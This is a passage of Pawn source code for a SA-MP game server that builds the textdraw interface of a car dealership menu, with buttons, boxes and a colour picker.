	TextDrawUseBox(autosalon_global_td[34], 1);
	TextDrawBoxColor(autosalon_global_td[34], 0);
	TextDrawSetShadow(autosalon_global_td[34], 0);
	TextDrawSetOutline(autosalon_global_td[34], 0);
	TextDrawBackgroundColor(autosalon_global_td[34], 255);
	TextDrawFont(autosalon_global_td[34], 2);
	TextDrawSetProportional(autosalon_global_td[34], 1);
	TextDrawSetShadow(autosalon_global_td[34], 0);

	autosalon_global_td[35] = TextDrawCreate(509.600097, 238.567199, "ld_pool:ball");
	TextDrawLetterSize(autosalon_global_td[35], 0.000000, 0.000000);
	TextDrawTextSize(autosalon_global_td[35], 24.000000, 21.000000);
	TextDrawAlignment(autosalon_global_td[35], 1);
	TextDrawColor(autosalon_global_td[35], -1315897089);
	TextDrawSetShadow(autosalon_global_td[35], 0);
	TextDrawSetOutline(autosalon_global_td[35], 0);
	TextDrawBackgroundColor(autosalon_global_td[35], 255);
	TextDrawFont(autosalon_global_td[35], 4);
	TextDrawSetProportional(autosalon_global_td[35], 0);
	TextDrawSetShadow(autosalon_global_td[35], 0);

	autosalon_global_td[36] = TextDrawCreate(606.877075, 238.967224, "ld_pool:ball");
	TextDrawLetterSize(autosalon_global_td[36], 0.000000, 0.000000);
	TextDrawTextSize(autosalon_global_td[36], 24.000000, 21.000000);
	TextDrawAlignment(autosalon_global_td[36], 1);
	TextDrawColor(autosalon_global_td[36], -1315897089);
	TextDrawSetShadow(autosalon_global_td[36], 0);
	TextDrawSetOutline(autosalon_global_td[36], 0);
	TextDrawBackgroundColor(autosalon_global_td[36], 255);
	TextDrawFont(autosalon_global_td[36], 4);
	TextDrawSetProportional(autosalon_global_td[36], 0);
	TextDrawSetShadow(autosalon_global_td[36], 0);

	autosalon_global_td[37] = TextDrawCreate(511.300292, 240.265808, "ld_pool:ball");
	TextDrawLetterSize(autosalon_global_td[37], 0.000000, 0.000000);
	TextDrawTextSize(autosalon_global_td[37], 20.439918, 17.559967);
	TextDrawAlignment(autosalon_global_td[37], 1);
	TextDrawColor(autosalon_global_td[37], 419954943);
	TextDrawSetShadow(autosalon_global_td[37], 0);
	TextDrawSetOutline(autosalon_global_td[37], 0);
	TextDrawBackgroundColor(autosalon_global_td[37], 255);
	TextDrawFont(autosalon_global_td[37], 4);
	TextDrawSetProportional(autosalon_global_td[37], 0);
	TextDrawSetShadow(autosalon_global_td[37], 0);

	autosalon_global_td[38] = TextDrawCreate(608.700439, 240.678466, "ld_pool:ball");
	TextDrawLetterSize(autosalon_global_td[38], 0.000000, 0.000000);
	TextDrawTextSize(autosalon_global_td[38], 20.439918, 17.559967);
	TextDrawAlignment(autosalon_global_td[38], 1);
	TextDrawColor(autosalon_global_td[38], 419954943);
	TextDrawSetShadow(autosalon_global_td[38], 0);
	TextDrawSetOutline(autosalon_global_td[38], 0);
	TextDrawBackgroundColor(autosalon_global_td[38], 255);
	TextDrawFont(autosalon_global_td[38], 4);
	TextDrawSetProportional(autosalon_global_td[38], 0);
	TextDrawSetShadow(autosalon_global_td[38], 0);

	autosalon_global_td[39] = TextDrawCreate(535.795288, 238.602966, "ld_pool:ball");
	TextDrawLetterSize(autosalon_global_td[39], 0.000000, 0.000000);
	TextDrawTextSize(autosalon_global_td[39], 24.000000, 21.000000);
	TextDrawAlignment(autosalon_global_td[39], 1);
	TextDrawColor(autosalon_global_td[39], -1315897089);
	TextDrawSetShadow(autosalon_global_td[39], 0);
	TextDrawSetOutline(autosalon_global_td[39], 0);
	TextDrawBackgroundColor(autosalon_global_td[39], 255);
	TextDrawFont(autosalon_global_td[39], 4);
	TextDrawSetProportional(autosalon_global_td[39], 0);
	TextDrawSetShadow(autosalon_global_td[39], 0);

	autosalon_global_td[40] = TextDrawCreate(580.684326, 238.602966, "ld_pool:ball");
	TextDrawLetterSize(autosalon_global_td[40], 0.000000, 0.000000);
	TextDrawTextSize(autosalon_global_td[40], 24.000000, 21.000000);
	TextDrawAlignment(autosalon_global_td[40], 1);
	TextDrawColor(autosalon_global_td[40], -1315897089);
	TextDrawSetShadow(autosalon_global_td[40], 0);
	TextDrawSetOutline(autosalon_global_td[40], 0);
	TextDrawBackgroundColor(autosalon_global_td[40], 255);
	TextDrawFont(autosalon_global_td[40], 4);
	TextDrawSetProportional(autosalon_global_td[40], 0);
	TextDrawSetShadow(autosalon_global_td[40], 0);

	autosalon_global_td[41] = TextDrawCreate(549.699829, 240.765625, "box");
	TextDrawLetterSize(autosalon_global_td[41], 0.000000, 1.854997);
	TextDrawTextSize(autosalon_global_td[41], 592.000000, 0.000000);
	TextDrawAlignment(autosalon_global_td[41], 1);
	TextDrawColor(autosalon_global_td[41], -1);
	TextDrawUseBox(autosalon_global_td[41], 1);
	TextDrawBoxColor(autosalon_global_td[41], -1315897089);
	TextDrawSetShadow(autosalon_global_td[41], 0);
	TextDrawSetOutline(autosalon_global_td[41], 0);
	TextDrawBackgroundColor(autosalon_global_td[41], 255);
	TextDrawFont(autosalon_global_td[41], 1);
	TextDrawSetProportional(autosalon_global_td[41], 1);
	TextDrawSetShadow(autosalon_global_td[41], 0);

	autosalon_global_td[42] = TextDrawCreate(537.900146, 240.390869, "ld_pool:ball");
	TextDrawLetterSize(autosalon_global_td[42], 0.000000, 0.000000);
	TextDrawTextSize(autosalon_global_td[42], 20.439918, 17.559967);
	TextDrawAlignment(autosalon_global_td[42], 1);
	TextDrawColor(autosalon_global_td[42], 419954943);
	TextDrawSetShadow(autosalon_global_td[42], 0);
	TextDrawSetOutline(autosalon_global_td[42], 0);
	TextDrawBackgroundColor(autosalon_global_td[42], 255);
	TextDrawFont(autosalon_global_td[42], 4);
	TextDrawSetProportional(autosalon_global_td[42], 0);
	TextDrawSetShadow(autosalon_global_td[42], 0);

	autosalon_global_td[43] = TextDrawCreate(582.189331, 240.390869, "ld_pool:ball");
	TextDrawLetterSize(autosalon_global_td[43], 0.000000, 0.000000);
	TextDrawTextSize(autosalon_global_td[43], 20.439918, 17.559967);
	TextDrawAlignment(autosalon_global_td[43], 1);
	TextDrawColor(autosalon_global_td[43], 419954943);
	TextDrawSetShadow(autosalon_global_td[43], 0);
	TextDrawSetOutline(autosalon_global_td[43], 0);
	TextDrawBackgroundColor(autosalon_global_td[43], 255);
	TextDrawFont(autosalon_global_td[43], 4);
	TextDrawSetProportional(autosalon_global_td[43], 0);
	TextDrawSetShadow(autosalon_global_td[43], 0);

	autosalon_global_td[44] = TextDrawCreate(548.800476, 242.115386, "box");
	TextDrawLetterSize(autosalon_global_td[44], 0.000000, 1.554991);
	TextDrawTextSize(autosalon_global_td[44], 591.120117, 0.000000);
	TextDrawAlignment(autosalon_global_td[44], 1);
	TextDrawColor(autosalon_global_td[44], -1);
	TextDrawUseBox(autosalon_global_td[44], 1);
	TextDrawBoxColor(autosalon_global_td[44], 419954943);
	TextDrawSetShadow(autosalon_global_td[44], 0);
	TextDrawSetOutline(autosalon_global_td[44], 0);
	TextDrawBackgroundColor(autosalon_global_td[44], 255);
	TextDrawFont(autosalon_global_td[44], 1);
	TextDrawSetProportional(autosalon_global_td[44], 1);
	TextDrawSetShadow(autosalon_global_td[44], 0);

	autosalon_global_td[45] = TextDrawCreate(521.299804, 243.377990, "<");
	TextDrawLetterSize(autosalon_global_td[45], 0.257499, 1.225625);
	TextDrawTextSize(autosalon_global_td[45], 10.000000, 10.000000);
	TextDrawAlignment(autosalon_global_td[45], 2);
	TextDrawColor(autosalon_global_td[45], -1);
	TextDrawUseBox(autosalon_global_td[45], 1);
	TextDrawBoxColor(autosalon_global_td[45], 0);
	TextDrawSetShadow(autosalon_global_td[45], 0);
	TextDrawSetOutline(autosalon_global_td[45], 0);
	TextDrawBackgroundColor(autosalon_global_td[45], 255);
	TextDrawFont(autosalon_global_td[45], 2);
	TextDrawSetProportional(autosalon_global_td[45], 1);
	TextDrawSetShadow(autosalon_global_td[45], 0);
	TextDrawSetSelectable(autosalon_global_td[45], true);

	autosalon_global_td[46] = TextDrawCreate(620.475585, 243.377990, ">");
	TextDrawLetterSize(autosalon_global_td[46], 0.257499, 1.225625);
	TextDrawTextSize(autosalon_global_td[46], 10.000000, 10.000000);
	TextDrawAlignment(autosalon_global_td[46], 2);
	TextDrawColor(autosalon_global_td[46], -1);
	TextDrawUseBox(autosalon_global_td[46], 1);
	TextDrawBoxColor(autosalon_global_td[46], 0);
	TextDrawSetShadow(autosalon_global_td[46], 0);
	TextDrawSetOutline(autosalon_global_td[46], 0);
	TextDrawBackgroundColor(autosalon_global_td[46], 255);
	TextDrawFont(autosalon_global_td[46], 2);
	TextDrawSetProportional(autosalon_global_td[46], 1);
	TextDrawSetShadow(autosalon_global_td[46], 0);
	TextDrawSetSelectable(autosalon_global_td[46], true);

	autosalon_global_td[47] = TextDrawCreate(570.875976, 244.178039, "цвет_салона");
	TextDrawLetterSize(autosalon_global_td[47], 0.174500, 0.965623);
	TextDrawTextSize(autosalon_global_td[47], 0.000000, 10.000000);
	TextDrawAlignment(autosalon_global_td[47], 2);
	TextDrawColor(autosalon_global_td[47], -1);
	TextDrawUseBox(autosalon_global_td[47], 1);
	TextDrawBoxColor(autosalon_global_td[47], 0);
	TextDrawSetShadow(autosalon_global_td[47], 0);
	TextDrawSetOutline(autosalon_global_td[47], 0);
	TextDrawBackgroundColor(autosalon_global_td[47], 255);
	TextDrawFont(autosalon_global_td[47], 2);
	TextDrawSetProportional(autosalon_global_td[47], 1);
	TextDrawSetShadow(autosalon_global_td[47], 0);

	autosalon_global_td[48] = TextDrawCreate(509.907562, 264.817199, "ld_pool:ball");
	TextDrawLetterSize(autosalon_global_td[48], 0.000000, 0.000000);
	TextDrawTextSize(autosalon_global_td[48], 19.000000, 16.000000);
	TextDrawAlignment(autosalon_global_td[48], 1);
	TextDrawColor(autosalon_global_td[48], -1315897089);
	TextDrawSetShadow(autosalon_global_td[48], 0);
	TextDrawSetOutline(autosalon_global_td[48], 0);
	TextDrawBackgroundColor(autosalon_global_td[48], 255);
	TextDrawFont(autosalon_global_td[48], 4);
	TextDrawSetProportional(autosalon_global_td[48], 0);
	TextDrawSetShadow(autosalon_global_td[48], 0);

	autosalon_global_td[49] = TextDrawCreate(611.683349, 264.817199, "ld_pool:ball");
	TextDrawLetterSize(autosalon_global_td[49], 0.000000, 0.000000);
	TextDrawTextSize(autosalon_global_td[49], 19.000000, 16.000000);
	TextDrawAlignment(autosalon_global_td[49], 1);
	TextDrawColor(autosalon_global_td[49], -1315897089);
	TextDrawSetShadow(autosalon_global_td[49], 0);
	TextDrawSetOutline(autosalon_global_td[49], 0);
	TextDrawBackgroundColor(autosalon_global_td[49], 255);
	TextDrawFont(autosalon_global_td[49], 4);
	TextDrawSetProportional(autosalon_global_td[49], 0);
	TextDrawSetShadow(autosalon_global_td[49], 0);

	autosalon_global_td[50] = TextDrawCreate(520.699951, 267.212219, "box");
	TextDrawLetterSize(autosalon_global_td[50], 0.000000, 1.233999);
	TextDrawTextSize(autosalon_global_td[50], 620.000000, 0.000000);
	TextDrawAlignment(autosalon_global_td[50], 1);
	TextDrawColor(autosalon_global_td[50], -1);
	TextDrawUseBox(autosalon_global_td[50], 1);
	TextDrawBoxColor(autosalon_global_td[50], -1315897089);
	TextDrawSetShadow(autosalon_global_td[50], 0);
	TextDrawSetOutline(autosalon_global_td[50], 0);
	TextDrawBackgroundColor(autosalon_global_td[50], 255);
	TextDrawFont(autosalon_global_td[50], 1);
	TextDrawSetProportional(autosalon_global_td[50], 1);
	TextDrawSetShadow(autosalon_global_td[50], 0);

	autosalon_global_td[51] = TextDrawCreate(511.407897, 266.329711, "ld_pool:ball");
	TextDrawLetterSize(autosalon_global_td[51], 0.000000, 0.000000);
	TextDrawTextSize(autosalon_global_td[51], 15.000000, 13.060024);
	TextDrawAlignment(autosalon_global_td[51], 1);
	TextDrawColor(autosalon_global_td[51], 419954943);
	TextDrawSetShadow(autosalon_global_td[51], 0);
	TextDrawSetOutline(autosalon_global_td[51], 0);
	TextDrawBackgroundColor(autosalon_global_td[51], 255);
	TextDrawFont(autosalon_global_td[51], 4);
	TextDrawSetProportional(autosalon_global_td[51], 0);
	TextDrawSetShadow(autosalon_global_td[51], 0);

	autosalon_global_td[52] = TextDrawCreate(613.806762, 266.292236, "ld_pool:ball");
	TextDrawLetterSize(autosalon_global_td[52], 0.000000, 0.000000);
	TextDrawTextSize(autosalon_global_td[52], 15.000000, 13.060024);
	TextDrawAlignment(autosalon_global_td[52], 1);
	TextDrawColor(autosalon_global_td[52], 419954943);
	TextDrawSetShadow(autosalon_global_td[52], 0);
	TextDrawSetOutline(autosalon_global_td[52], 0);
	TextDrawBackgroundColor(autosalon_global_td[52], 255);
	TextDrawFont(autosalon_global_td[52], 4);
	TextDrawSetProportional(autosalon_global_td[52], 0);
	TextDrawSetShadow(autosalon_global_td[52], 0);

	autosalon_global_td[53] = TextDrawCreate(520.699951, 268.112274, "box");
	TextDrawLetterSize(autosalon_global_td[53], 0.000000, 1.034000);
	TextDrawTextSize(autosalon_global_td[53], 620.152099, 0.000000);
	TextDrawAlignment(autosalon_global_td[53], 1);
	TextDrawColor(autosalon_global_td[53], -1);
	TextDrawUseBox(autosalon_global_td[53], 1);
	TextDrawBoxColor(autosalon_global_td[53], 419954943);
	TextDrawSetShadow(autosalon_global_td[53], 0);
	TextDrawSetOutline(autosalon_global_td[53], 0);
	TextDrawBackgroundColor(autosalon_global_td[53], 255);
	TextDrawFont(autosalon_global_td[53], 1);
	TextDrawSetProportional(autosalon_global_td[53], 1);
	TextDrawSetShadow(autosalon_global_td[53], 0);

	autosalon_global_td[54] = TextDrawCreate(571.675903, 267.501953, "BUY");
	TextDrawLetterSize(autosalon_global_td[54], 0.174500, 0.965623);
	TextDrawTextSize(autosalon_global_td[54], 10.000000, 10.000000);
	TextDrawAlignment(autosalon_global_td[54], 2);
	TextDrawColor(autosalon_global_td[54], -1);
	TextDrawUseBox(autosalon_global_td[54], 1);
	TextDrawBoxColor(autosalon_global_td[54], 0);
	TextDrawSetShadow(autosalon_global_td[54], 0);
	TextDrawSetOutline(autosalon_global_td[54], 0);
	TextDrawBackgroundColor(autosalon_global_td[54], 255);
	TextDrawFont(autosalon_global_td[54], 2);
	TextDrawSetProportional(autosalon_global_td[54], 1);
	TextDrawSetShadow(autosalon_global_td[54], 0);
	TextDrawSetSelectable(autosalon_global_td[54], true);

	autosalon_global_td[55] = TextDrawCreate(509.600097, 159.762390, "ld_pool:ball");
	TextDrawLetterSize(autosalon_global_td[55], 0.000000, 0.000000);
	TextDrawTextSize(autosalon_global_td[55], 2.000000, 2.000000);
	TextDrawAlignment(autosalon_global_td[55], 1);
	TextDrawColor(autosalon_global_td[55], -1315897089);
	TextDrawSetShadow(autosalon_global_td[55], 0);
	TextDrawSetOutline(autosalon_global_td[55], 0);
	TextDrawBackgroundColor(autosalon_global_td[55], 255);
	TextDrawFont(autosalon_global_td[55], 4);
	TextDrawSetProportional(autosalon_global_td[55], 0);
	TextDrawSetShadow(autosalon_global_td[55], 0);

	autosalon_global_td[56] = TextDrawCreate(532.999633, 185.862274, "ld_pool:ball");
	TextDrawLetterSize(autosalon_global_td[56], 0.000000, 0.000000);
	TextDrawTextSize(autosalon_global_td[56], 2.000000, 2.000000);
	TextDrawAlignment(autosalon_global_td[56], 1);
	TextDrawColor(autosalon_global_td[56], -1315897089);
	TextDrawSetShadow(autosalon_global_td[56], 0);
	TextDrawSetOutline(autosalon_global_td[56], 0);
	TextDrawBackgroundColor(autosalon_global_td[56], 255);
	TextDrawFont(autosalon_global_td[56], 4);
	TextDrawSetProportional(autosalon_global_td[56], 0);
	TextDrawSetShadow(autosalon_global_td[56], 0);

	autosalon_global_td[57] = TextDrawCreate(625.699340, 158.299774, "ld_pool:ball");
	TextDrawLetterSize(autosalon_global_td[57], 0.000000, 0.000000);
	TextDrawTextSize(autosalon_global_td[57], 2.000000, 2.000000);
	TextDrawAlignment(autosalon_global_td[57], 1);
	TextDrawColor(autosalon_global_td[57], -1315897089);
	TextDrawSetShadow(autosalon_global_td[57], 0);
	TextDrawSetOutline(autosalon_global_td[57], 0);
	TextDrawBackgroundColor(autosalon_global_td[57], 255);
	TextDrawFont(autosalon_global_td[57], 4);
	TextDrawSetProportional(autosalon_global_td[57], 0);
	TextDrawSetShadow(autosalon_global_td[57], 0);

	autosalon_global_td[58] = TextDrawCreate(603.699340, 234.862274, "ld_pool:ball");
	TextDrawLetterSize(autosalon_global_td[58], 0.000000, 0.000000);
	TextDrawTextSize(autosalon_global_td[58], 2.000000, 2.000000);
	TextDrawAlignment(autosalon_global_td[58], 1);
	TextDrawColor(autosalon_global_td[58], -1315897089);
	TextDrawSetShadow(autosalon_global_td[58], 0);
	TextDrawSetOutline(autosalon_global_td[58], 0);
	TextDrawBackgroundColor(autosalon_global_td[58], 255);
	TextDrawFont(autosalon_global_td[58], 4);
	TextDrawSetProportional(autosalon_global_td[58], 0);
	TextDrawSetShadow(autosalon_global_td[58], 0);

	autosalon_global_td[59] = TextDrawCreate(533.699340, 260.674774, "ld_pool:ball");
	TextDrawLetterSize(autosalon_global_td[59], 0.000000, 0.000000);
	TextDrawTextSize(autosalon_global_td[59], 2.000000, 2.000000);
	TextDrawAlignment(autosalon_global_td[59], 1);
	TextDrawColor(autosalon_global_td[59], -1315897089);
	TextDrawSetShadow(autosalon_global_td[59], 0);
	TextDrawSetOutline(autosalon_global_td[59], 0);
	TextDrawBackgroundColor(autosalon_global_td[59], 255);
	TextDrawFont(autosalon_global_td[59], 4);
	TextDrawSetProportional(autosalon_global_td[59], 0);
	TextDrawSetShadow(autosalon_global_td[59], 0);

	autosalon_global_td[60] = TextDrawCreate(617.699340, 283.424774, "ld_pool:ball");
	TextDrawLetterSize(autosalon_global_td[60], 0.000000, 0.000000);
	TextDrawTextSize(autosalon_global_td[60], 2.000000, 2.000000);
	TextDrawAlignment(autosalon_global_td[60], 1);
	TextDrawColor(autosalon_global_td[60], -1315897089);
	TextDrawSetShadow(autosalon_global_td[60], 0);
	TextDrawSetOutline(autosalon_global_td[60], 0);
	TextDrawBackgroundColor(autosalon_global_td[60], 255);
	TextDrawFont(autosalon_global_td[60], 4);
	TextDrawSetProportional(autosalon_global_td[60], 0);
	TextDrawSetShadow(autosalon_global_td[60], 0);

	autosalon_global_td[61] = TextDrawCreate(591.699340, 159.174774, "ld_pool:ball");
	TextDrawLetterSize(autosalon_global_td[61], 0.000000, 0.000000);
	TextDrawTextSize(autosalon_global_td[61], 1.649999, 1.220000);
	TextDrawAlignment(autosalon_global_td[61], 1);
	TextDrawColor(autosalon_global_td[61], -1315897089);
	TextDrawSetShadow(autosalon_global_td[61], 0);
	TextDrawSetOutline(autosalon_global_td[61], 0);
	TextDrawBackgroundColor(autosalon_global_td[61], 255);
	TextDrawFont(autosalon_global_td[61], 4);
	TextDrawSetProportional(autosalon_global_td[61], 0);
	TextDrawSetShadow(autosalon_global_td[61], 0);

	autosalon_global_td[62] = TextDrawCreate(570.199340, 183.499816, "ld_pool:ball");
	TextDrawLetterSize(autosalon_global_td[62], 0.000000, 0.000000);
	TextDrawTextSize(autosalon_global_td[62], 1.649999, 1.220000);
	TextDrawAlignment(autosalon_global_td[62], 1);
	TextDrawColor(autosalon_global_td[62], -1315897089);
	TextDrawSetShadow(autosalon_global_td[62], 0);
	TextDrawSetOutline(autosalon_global_td[62], 0);
	TextDrawBackgroundColor(autosalon_global_td[62], 255);
	TextDrawFont(autosalon_global_td[62], 4);
	TextDrawSetProportional(autosalon_global_td[62], 0);
	TextDrawSetShadow(autosalon_global_td[62], 0);

	autosalon_global_td[63] = TextDrawCreate(508.699340, 284.562316, "ld_pool:ball");
	TextDrawLetterSize(autosalon_global_td[63], 0.000000, 0.000000);
	TextDrawTextSize(autosalon_global_td[63], 1.649999, 1.220000);
	TextDrawAlignment(autosalon_global_td[63], 1);
	TextDrawColor(autosalon_global_td[63], -1315897089);
	TextDrawSetShadow(autosalon_global_td[63], 0);
	TextDrawSetOutline(autosalon_global_td[63], 0);
	TextDrawBackgroundColor(autosalon_global_td[63], 255);
	TextDrawFont(autosalon_global_td[63], 4);
	TextDrawSetProportional(autosalon_global_td[63], 0);
	TextDrawSetShadow(autosalon_global_td[63], 0);

	autosalon_global_td[64] = TextDrawCreate(618.998535, 144.224822, "box");
	TextDrawLetterSize(autosalon_global_td[64], 0.000000, 1.003998);
	TextDrawTextSize(autosalon_global_td[64], 630.588012, 0.000000);
	TextDrawAlignment(autosalon_global_td[64], 1);
	TextDrawColor(autosalon_global_td[64], -1);
	TextDrawUseBox(autosalon_global_td[64], 1);
	TextDrawBoxColor(autosalon_global_td[64], 419954943);
	TextDrawSetShadow(autosalon_global_td[64], 0);
	TextDrawSetOutline(autosalon_global_td[64], 0);
	TextDrawBackgroundColor(autosalon_global_td[64], 255);
	TextDrawFont(autosalon_global_td[64], 1);
	TextDrawSetProportional(autosalon_global_td[64], 1);
	TextDrawSetShadow(autosalon_global_td[64], 0);

	autosalon_global_td[65] = TextDrawCreate(619.800048, 145.249725, "box");
	TextDrawLetterSize(autosalon_global_td[65], 0.000000, 0.795997);
	TextDrawTextSize(autosalon_global_td[65], 629.600097, 0.000000);
	TextDrawAlignment(autosalon_global_td[65], 1);
	TextDrawColor(autosalon_global_td[65], -1);
	TextDrawUseBox(autosalon_global_td[65], 1);
	TextDrawBoxColor(autosalon_global_td[65], -1315897089);
	TextDrawSetShadow(autosalon_global_td[65], 0);
	TextDrawSetOutline(autosalon_global_td[65], 0);
	TextDrawBackgroundColor(autosalon_global_td[65], 255);
	TextDrawFont(autosalon_global_td[65], 1);
	TextDrawSetProportional(autosalon_global_td[65], 1);
	TextDrawSetShadow(autosalon_global_td[65], 0);

	autosalon_global_td[66] = TextDrawCreate(625.476318, 143.689453, "X");
	TextDrawLetterSize(autosalon_global_td[66], 0.253500, 0.965623);
	TextDrawTextSize(autosalon_global_td[66], 10.000000, 10.000000);
	TextDrawAlignment(autosalon_global_td[66], 2);
	TextDrawColor(autosalon_global_td[66], -1);
	TextDrawUseBox(autosalon_global_td[66], 1);
	TextDrawBoxColor(autosalon_global_td[66], 0);
	TextDrawSetShadow(autosalon_global_td[66], 0);
	TextDrawSetOutline(autosalon_global_td[66], 0);
	TextDrawBackgroundColor(autosalon_global_td[66], 255);
	TextDrawFont(autosalon_global_td[66], 2);
	TextDrawSetProportional(autosalon_global_td[66], 1);
	TextDrawSetShadow(autosalon_global_td[66], 0);
	TextDrawSetSelectable(autosalon_global_td[66], true);

	autosalon_td[0] = TextDrawCreate(232.333404, 358.399841, "cromulent:avtosalon");
	TextDrawLetterSize(autosalon_td[0], 0.000000, 0.000000);
	TextDrawTextSize(autosalon_td[0], 170.666809, 77.570449);
	TextDrawAlignment(autosalon_td[0], 1);
	TextDrawColor(autosalon_td[0], -1);
	TextDrawSetShadow(autosalon_td[0], 0);
	TextDrawSetOutline(autosalon_td[0], 0);
	TextDrawFont(autosalon_td[0], 4);

	autosalon_td[1] = TextDrawCreate(239.666671, 376.651855, "cromulent:white");
	TextDrawLetterSize(autosalon_td[1], 0.000000, 0.000000);
	TextDrawTextSize(autosalon_td[1], 19.666641, 26.962951);
	TextDrawAlignment(autosalon_td[1], 1);
	TextDrawColor(autosalon_td[1], -1);
	TextDrawSetShadow(autosalon_td[1], 0);
	TextDrawSetOutline(autosalon_td[1], 0);
	TextDrawFont(autosalon_td[1], 4);
	TextDrawSetSelectable(autosalon_td[1], true);

	autosalon_td[2] = TextDrawCreate(375.666656, 374.992584, "cromulent:white");
	TextDrawLetterSize(autosalon_td[2], 0.000000, 0.000000);
	TextDrawTextSize(autosalon_td[2], 20.666687, 27.792602);
	TextDrawAlignment(autosalon_td[2], 1);
	TextDrawColor(autosalon_td[2], -1);
	TextDrawSetShadow(autosalon_td[2], 0);
	TextDrawSetOutline(autosalon_td[2], 0);
	TextDrawFont(autosalon_td[2], 4);
	TextDrawSetSelectable(autosalon_td[2], true);

	autosalon_td[3] = TextDrawCreate(263.333343, 388.266662, "cromulent:white");
	TextDrawLetterSize(autosalon_td[3], 0.000000, 0.000000);
	TextDrawTextSize(autosalon_td[3], 69.666656, 24.059265);
	TextDrawAlignment(autosalon_td[3], 1);
	TextDrawColor(autosalon_td[3], -1);
	TextDrawSetShadow(autosalon_td[3], 0);
	TextDrawSetOutline(autosalon_td[3], 0);
	TextDrawFont(autosalon_td[3], 4);
	TextDrawSetSelectable(autosalon_td[3], true);

	autosalon_td[4] = TextDrawCreate(337.333343, 387.022216, "cromulent:white");
	TextDrawLetterSize(autosalon_td[4], 0.000000, 0.000000);
	TextDrawTextSize(autosalon_td[4], 34.000000, 26.133331);
	TextDrawAlignment(autosalon_td[4], 1);
	TextDrawColor(autosalon_td[4], -1);
	TextDrawSetShadow(autosalon_td[4], 0);
	TextDrawSetOutline(autosalon_td[4], 0);
	TextDrawFont(autosalon_td[4], 4);
	TextDrawSetSelectable(autosalon_td[4], true);

	color_menu_global_td[0] = TextDrawCreate(211.500000, 186.500000, "LD_BEAT:Chit");
	TextDrawLetterSize(color_menu_global_td[0], 0.000000, 0.000000);
	TextDrawTextSize(color_menu_global_td[0], 32.000000, 28.000000);
	TextDrawAlignment(color_menu_global_td[0], 1);
	TextDrawColor(color_menu_global_td[0], -1382874881);
	TextDrawSetShadow(color_menu_global_td[0], 0);
	TextDrawSetOutline(color_menu_global_td[0], 0);
	TextDrawBackgroundColor(color_menu_global_td[0], 255);
	TextDrawFont(color_menu_global_td[0], 4);
	TextDrawSetProportional(color_menu_global_td[0], 0);
	TextDrawSetShadow(color_menu_global_td[0], 0);

	color_menu_global_td[1] = TextDrawCreate(393.611114, 186.500000, "LD_BEAT:Chit");
	TextDrawLetterSize(color_menu_global_td[1], 0.000000, 0.000000);
	TextDrawTextSize(color_menu_global_td[1], 32.000000, 28.000000);
	TextDrawAlignment(color_menu_global_td[1], 1);
	TextDrawColor(color_menu_global_td[1], -1382874881);
	TextDrawSetShadow(color_menu_global_td[1], 0);
	TextDrawSetOutline(color_menu_global_td[1], 0);
	TextDrawBackgroundColor(color_menu_global_td[1], 255);
	TextDrawFont(color_menu_global_td[1], 4);
	TextDrawSetProportional(color_menu_global_td[1], 0);
	TextDrawSetShadow(color_menu_global_td[1], 0);

	color_menu_global_td[2] = TextDrawCreate(211.500091, 273.899993, "LD_BEAT:Chit");
	TextDrawLetterSize(color_menu_global_td[2], 0.000000, 0.000000);
	TextDrawTextSize(color_menu_global_td[2], 32.000000, 28.000000);
	TextDrawAlignment(color_menu_global_td[2], 1);
	TextDrawColor(color_menu_global_td[2], -1382874881);
	TextDrawSetShadow(color_menu_global_td[2], 0);
	TextDrawSetOutline(color_menu_global_td[2], 0);
	TextDrawBackgroundColor(color_menu_global_td[2], 255);
	TextDrawFont(color_menu_global_td[2], 4);
	TextDrawSetProportional(color_menu_global_td[2], 0);
	TextDrawSetShadow(color_menu_global_td[2], 0);

	color_menu_global_td[3] = TextDrawCreate(393.611206, 273.899993, "LD_BEAT:Chit");
	TextDrawLetterSize(color_menu_global_td[3], 0.000000, 0.000000);
	TextDrawTextSize(color_menu_global_td[3], 32.000000, 28.000000);
	TextDrawAlignment(color_menu_global_td[3], 1);
	TextDrawColor(color_menu_global_td[3], -1382874881);
	TextDrawSetShadow(color_menu_global_td[3], 0);
	TextDrawSetOutline(color_menu_global_td[3], 0);
	TextDrawBackgroundColor(color_menu_global_td[3], 255);
	TextDrawFont(color_menu_global_td[3], 4);
	TextDrawSetProportional(color_menu_global_td[3], 0);
	TextDrawSetShadow(color_menu_global_td[3], 0);

	color_menu_global_td[4] = TextDrawCreate(229.500000, 192.587524, "box");
	TextDrawLetterSize(color_menu_global_td[4], 0.000000, 11.462925);
	TextDrawTextSize(color_menu_global_td[4], 407.000000, 0.000000);
	TextDrawAlignment(color_menu_global_td[4], 1);
	TextDrawColor(color_menu_global_td[4], -1);
	TextDrawUseBox(color_menu_global_td[4], 1);
	TextDrawBoxColor(color_menu_global_td[4], -1382874881);
	TextDrawSetShadow(color_menu_global_td[4], 0);
	TextDrawSetOutline(color_menu_global_td[4], 0);
	TextDrawBackgroundColor(color_menu_global_td[4], 255);
	TextDrawFont(color_menu_global_td[4], 1);
	TextDrawSetProportional(color_menu_global_td[4], 1);
	TextDrawSetShadow(color_menu_global_td[4], 0);

	color_menu_global_td[5] = TextDrawCreate(219.000000, 203.525024, "box");
	TextDrawLetterSize(color_menu_global_td[5], 0.000000, 8.962929);
	TextDrawTextSize(color_menu_global_td[5], 418.281250, 0.000000);
	TextDrawAlignment(color_menu_global_td[5], 1);
	TextDrawColor(color_menu_global_td[5], -1);
	TextDrawUseBox(color_menu_global_td[5], 1);
	TextDrawBoxColor(color_menu_global_td[5], -1382874881);
	TextDrawSetShadow(color_menu_global_td[5], 0);
	TextDrawSetOutline(color_menu_global_td[5], 0);
	TextDrawBackgroundColor(color_menu_global_td[5], 255);
	TextDrawFont(color_menu_global_td[5], 1);
	TextDrawSetProportional(color_menu_global_td[5], 1);
	TextDrawSetShadow(color_menu_global_td[5], 0);

	color_menu_global_td[6] = TextDrawCreate(213.700134, 188.300109, "LD_BEAT:Chit");
	TextDrawLetterSize(color_menu_global_td[6], 0.000000, 0.000000);
	TextDrawTextSize(color_menu_global_td[6], 26.000000, 22.469987);
	TextDrawAlignment(color_menu_global_td[6], 1);
	TextDrawColor(color_menu_global_td[6], 419954943);
	TextDrawSetShadow(color_menu_global_td[6], 0);
	TextDrawSetOutline(color_menu_global_td[6], 0);
	TextDrawBackgroundColor(color_menu_global_td[6], 255);
	TextDrawFont(color_menu_global_td[6], 4);
	TextDrawSetProportional(color_menu_global_td[6], 0);
	TextDrawSetShadow(color_menu_global_td[6], 0);

